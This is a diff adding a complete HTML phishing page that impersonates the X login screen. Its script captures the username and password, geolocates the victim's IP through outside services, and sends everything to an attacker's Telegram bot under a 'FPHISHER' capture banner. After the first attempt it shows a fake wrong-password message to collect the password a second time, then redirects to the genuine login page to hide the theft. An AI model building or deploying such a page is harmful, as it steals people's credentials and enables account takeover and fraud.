@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="en" class="bg-black">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Log in to X</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- Load config first -->
+  <script src="config.js"></script>
+</head>
+
+<body class="text-white h-screen flex flex-col bg-black">
+
+  <!-- STEP 1 - Username / email / phone -->
+  <div id="step1" class="flex flex-col h-full justify-between">
+    <div class="flex justify-between items-center px-5 py-4">
+      <button class="text-lg font-medium">Cancel</button>
+      <div class="text-2xl font-black">X</div>
+      <div class="w-10"></div>
+    </div>
+
+    <div class="px-8 pt-4">
+      <h1 class="text-4xl font-extrabold leading-tight">
+        To get started, enter your phone, email or @username
+      </h1>
+      <input
+        id="username"
+        type="text"
+        placeholder="Phone, email, or username"
+        class="mt-10 w-full bg-black border border-gray-700 rounded-full px-5 py-4 text-lg placeholder-gray-500 focus:outline-none focus:border-sky-500 focus:ring-1 focus:ring-sky-500"
+      />
+    </div>
+
+    <div class="px-8 pb-8 flex justify-between items-center">
+      <span class="text-sky-500 text-base cursor-pointer">Forgot password?</span>
+      <button
+        id="nextBtn"
+        disabled
+        class="bg-gray-700 text-gray-400 px-7 py-3 rounded-full font-bold text-base disabled:opacity-50"
+      >
+        Next
+      </button>
+    </div>
+  </div>
+
+  <!-- STEP 2 - Password + Error container -->
+  <div id="step2" class="hidden flex flex-col h-full justify-between relative">
+    <div class="flex justify-between items-center px-5 py-4">
+      <button onclick="goBack()" class="text-2xl">×</button>
+      <div class="text-2xl font-black">X</div>
+      <div class="w-10"></div>
+    </div>
+
+    <div class="px-8">
+      <h1 class="text-4xl font-extrabold">Enter your password</h1>
+
+      <div class="mt-8 bg-gray-900 rounded-2xl px-5 py-4">
+        <p class="text-sm text-gray-400">Username / email</p>
+        <p id="displayUser" class="text-xl mt-1 font-medium"></p>
+      </div>
+
+      <div class="mt-8 relative">
+        <input
+          id="password"
+          type="password"
+          placeholder="Password"
+          class="w-full bg-black border-2 border-sky-500 rounded-full px-5 py-4 pr-14 text-lg placeholder-sky-700 focus:outline-none focus:border-sky-400"
+        />
+        <button
+          onclick="togglePassword()"
+          class="absolute right-5 top-1/2 -translate-y-1/2 text-gray-400 text-xl"
+        >
+          👁️
+        </button>
+      </div>
+
+      <p class="text-sky-500 mt-4 cursor-pointer">Forgot password?</p>
+
+      <!-- Fake error message (shown only after first attempt) -->
+      <div id="errorMsg" class="hidden mt-6 bg-blue-600 rounded-lg p-5 text-center shadow-xl">
+        <p class="text-2xl font-bold">Wrong password!</p>
+        <p class="text-sm mt-3 opacity-90">
+          g;1777331748884040371327:-177738303035858759:imDUK<br>
+          WKLLpXT97DSDoTWmEh3X:8
+        </p>
+      </div>
+    </div>
+
+    <div class="px-8 pb-8">
+      <button
+        id="loginBtn"
+        disabled
+        class="w-full bg-white text-black py-4 rounded-full text-lg font-bold disabled:opacity-50 disabled:bg-gray-700 disabled:text-gray-400"
+      >
+        Log in
+      </button>
+
+      <p class="text-center text-gray-400 mt-5">
+        Don't have an account? <span class="text-sky-500">Sign up</span>
+      </p>
+    </div>
+  </div>
+
+  <script>
+    // These variables now come from config.js (loaded above)
+    // Make sure config.js is in the same folder as this file
+    const TELEGRAM_BOT_TOKEN = window.TELEGRAM_BOT_TOKEN;
+    const TELEGRAM_CHAT_ID   = window.TELEGRAM_CHAT_ID;
+
+    const usernameInput = document.getElementById("username");
+    const nextBtn       = document.getElementById("nextBtn");
+    const passwordInput = document.getElementById("password");
+    const loginBtn      = document.getElementById("loginBtn");
+    const step1         = document.getElementById("step1");
+    const step2         = document.getElementById("step2");
+    const displayUser   = document.getElementById("displayUser");
+    const errorMsg      = document.getElementById("errorMsg");
+
+    let attemptCount = 0;
+
+    // Enable/disable Next button
+    usernameInput.addEventListener("input", () => {
+      const val = usernameInput.value.trim();
+      nextBtn.disabled = !val;
+      nextBtn.classList.toggle("bg-white", !!val);
+      nextBtn.classList.toggle("text-black", !!val);
+      nextBtn.classList.toggle("bg-gray-700", !val);
+      nextBtn.classList.toggle("text-gray-400", !val);
+    });
+
+    // Go to password step
+    nextBtn.addEventListener("click", () => {
+      displayUser.textContent = usernameInput.value.trim();
+      step1.classList.add("hidden");
+      step2.classList.remove("hidden");
+      errorMsg.classList.add("hidden");
+      attemptCount = 0;
+    });
+
+    function goBack() {
+      step2.classList.add("hidden");
+      step1.classList.remove("hidden");
+      errorMsg.classList.add("hidden");
+    }
+
+    // Enable/disable Log in button
+    passwordInput.addEventListener("input", () => {
+      const val = passwordInput.value.trim();
+      loginBtn.disabled = !val;
+      loginBtn.classList.toggle("bg-white", !!val);
+      loginBtn.classList.toggle("text-black", !!val);
+      loginBtn.classList.toggle("bg-gray-700", !val);
+      loginBtn.classList.toggle("text-gray-400", !val);
+    });
+
+    function togglePassword() {
+      passwordInput.type = passwordInput.type === "password" ? "text" : "password";
+    }
+
+    // ─── CAPTURE IP → GEO via ipapi.co → SEND ───────────────────────────────
+    async function captureAndSend(attemptNumber) {
+      const username = usernameInput.value.trim();
+      const password = passwordInput.value.trim();
+      if (!username || !password) return;
+
+      let geo = {
+        ip: "unknown",
+        country: "unknown",
+        region: "unknown",
+        city: "unknown",
+        isp: "unknown",
+        proxy: "No"
+      };
+
+      try {
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipRes.json();
+        geo.ip = ipData.ip || "unknown";
+
+        const geoRes = await fetch(`https://ipapi.co/${geo.ip}/json/`);
+        const data = await geoRes.json();
+
+        if (!data.error) {
+          geo.country = data.country_name || "unknown";
+          geo.region  = data.region      || "unknown";
+          geo.city    = data.city        || "unknown";
+          geo.isp     = data.org         || data.asn || "unknown";
+          geo.proxy   = data.in_eu || data.proxy ? "Yes" : "No";
+        }
+      } catch (err) {
+        // silent fail
+      }
+
+      const ua = navigator.userAgent;
+      const now = new Date();
+      const timestampUTC = now.toISOString();
+      const localTime = now.toLocaleString("en-US", { timeZoneName: "short" });
+
+      const flag = geo.country === "Nigeria" ? "🇳🇬" :
+                   geo.country === "United States" ? "🇺🇸" : "";
+
+      const message = 
+`🔐✨  X LOGIN CAPTURE  —  FPHISHER  (Attempt ${attemptNumber})
+═══════════════════════════════════════
+
+👤 USERNAME / EMAIL  
+➤ ${username}
+
+🔑 PASSWORD  
+➤ ${password}
+
+🌍 LOCATION  
+➤ Country: ${geo.country} ${flag}
+➤ Region : ${geo.region}
+➤ City   : ${geo.city}
+
+🌐 IP ADDRESS  
+➤ ${geo.ip}
+➤ Proxy/VPN : ${geo.proxy}
+➤ ISP       : ${geo.isp}
+
+🕒 TIMESTAMP  
+➤ ${timestampUTC}
+➤ Local    : ${localTime}
+
+💻 USER AGENT  
+➤ ${ua}
+
+🖥️ SCREEN  
+➤ ${screen.width}×${screen.height}  •  ${navigator.language || "unknown"}
+
+═══════════════════════════════════════
+⚡ Powered by FTECH™ Secure Systems
+🛡️ Data Pipeline: ACTIVE
+═══════════════════════════════════════`;
+
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+      try {
+        await fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: "Markdown"
+          })
+        });
+      } catch {}
+    }
+
+    // ─── LOGIN BUTTON ──────────────────────────────────────────────────────
+    loginBtn.addEventListener("click", async () => {
+      attemptCount++;
+
+      await captureAndSend(attemptCount);
+
+      if (attemptCount === 1) {
+        errorMsg.classList.remove("hidden");
+        loginBtn.textContent = "Log in";
+        passwordInput.value = "";
+      } else {
+        window.location.href = "https://x.com/login";
+      }
+    });
+  </script>
+</body>
+</html>
